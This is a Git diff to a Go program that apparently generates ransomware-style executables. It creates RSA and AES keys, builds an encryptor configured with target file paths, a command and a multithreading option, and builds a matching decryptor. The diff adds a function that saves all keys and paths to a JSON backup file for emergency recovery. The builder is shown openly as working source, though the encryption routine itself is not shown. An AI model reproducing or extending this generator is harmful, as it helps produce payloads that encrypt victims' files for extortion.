@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"strconv"
@@ -35,38 +36,42 @@ func del_model() error {
 	return nil
 }
 
-func generate(path_slice []string, aes_min int, cmd string, is_multi_thread bool) (string, string, error) {
+func generate(path_slice []string, aes_min int, cmd string, is_multi_thread bool) (string, string, string, error) {
 	err := init_model()
 	if err != nil {
-		return "", "", err
+		return "", "", "", err
 	}
 	//生成新的 公钥和私钥
 	publicKey, privateKey, err := getRSAPublicPrivate()
 	if err != nil {
-		return "", "", err
+		return "", "", "", err
 	}
 	//生成新的 AES 密钥
 	aesKey, err := getAES(24)
 	if err != nil {
-		return "", "", err
+		return "", "", "", err
 	}
 	fmt.Println(publicKey, privateKey, aesKey)
 
 	FILE_RANDSTRING, err = getAES(8)
 	if err != nil {
-		return "", "", err
+		return "", "", "", err
 	}
 
 	encryptorFilePath, err := generateEncryptor(publicKey, aesKey, path_slice, cmd, aes_min, is_multi_thread)
 	if err != nil {
-		return "", "", err
+		return "", "", "", err
 	}
 	decryptorFilePath, err := generateDecryptor(privateKey, aesKey, path_slice)
 	if err != nil {
-		return "", "", err
+		return "", "", "", err
+	}
+	backUpFilePath, err := generateBackUpFile(publicKey, privateKey, aesKey, path_slice)
+	if err != nil {
+		return "", "", "", err
 	}
 	del_model()
-	return encryptorFilePath, decryptorFilePath, nil
+	return encryptorFilePath, decryptorFilePath, backUpFilePath, nil
 }
 
 func generateEncryptor(publicKey string, aesKey string, path_slice []string, cmd string, aes_min int, is_multi_thread bool) (string, error) {
@@ -157,5 +162,30 @@ func generateDecryptor(privateKey string, aesKey string, path_slice []string) (s
 	newFilePath := fmt.Sprintf("./Decryptor_%s.exe", FILE_RANDSTRING)
 	fmt.Println(Symbol_Decryptor_PRIKEY, Symbol_Decryptor_AESKEY, Symbol_Decryptor_PATHS)
 	writeFile(newFilePath, DECRYPTOR_GENERATED)
+	return newFilePath, nil
+}
+
+type BackUpStruct struct {
+	PUBLIC_KEY  string
+	PRIVATE_KEY string
+	AES_KEY     string
+	PATH_SLICE  []string
+}
+
+func generateBackUpFile(publicKey string, privateKey string, aesKey string, path_slice []string) (string, error) {
+	fileContent := BackUpStruct{
+		PUBLIC_KEY:  publicKey,
+		PRIVATE_KEY: privateKey,
+		AES_KEY:     aesKey,
+		PATH_SLICE:  path_slice,
+	}
+
+	//生成文件名称，保存文件
+	fileJson, err := json.Marshal(fileContent)
+	if err != nil {
+		return "", err
+	}
+	newFilePath := fmt.Sprintf("./BackUpFile_%s(请勿删除，作为紧急恢复的备份).txt", FILE_RANDSTRING)
+	writeFile(newFilePath, fileJson)
 	return newFilePath, nil
 }
